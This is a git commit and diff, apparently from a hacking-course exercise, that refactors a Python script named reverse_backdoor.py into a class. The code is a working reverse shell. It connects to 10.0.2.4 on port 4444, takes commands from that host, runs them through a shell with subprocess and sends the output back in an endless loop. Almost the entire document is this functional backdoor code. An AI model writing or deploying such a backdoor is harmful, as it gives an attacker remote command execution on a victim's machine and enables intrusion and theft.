36117b1affc6f844fca59732fe56dcd03897372f
Mário Gil <mg_mesquita@hotmail.com>
2018-08-05 10:27:26 +0100

    Refactored backdoor in a class

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -3,17 +3,21 @@
 import socket, subprocess
 
 
-def execute_system_command(command):
-	return subprocess.check_output(command, shell=True)
+class Backdoor:
+	def __init__(self, ip, port):
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connection.connect((ip, port))
+
+	def execute_system_command(self, command):
+		return subprocess.check_output(command, shell=True)
+
+	def run(self):
+		while True:
+			command = self.connection.recv(1024)
+			command_result = self.execute_system_command(command)
+			self.connection.send(command_result)
+		self.connection.close()
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.4", 4444))
-
-while True:
-	command = connection.recv(1024)
-	command_result = execute_system_command(command)
-	connection.send(command_result)
-
-
-connection.close()
+my_backdoor = Backdoor("10.0.2.4", 4444)
+my_backdoor.run()
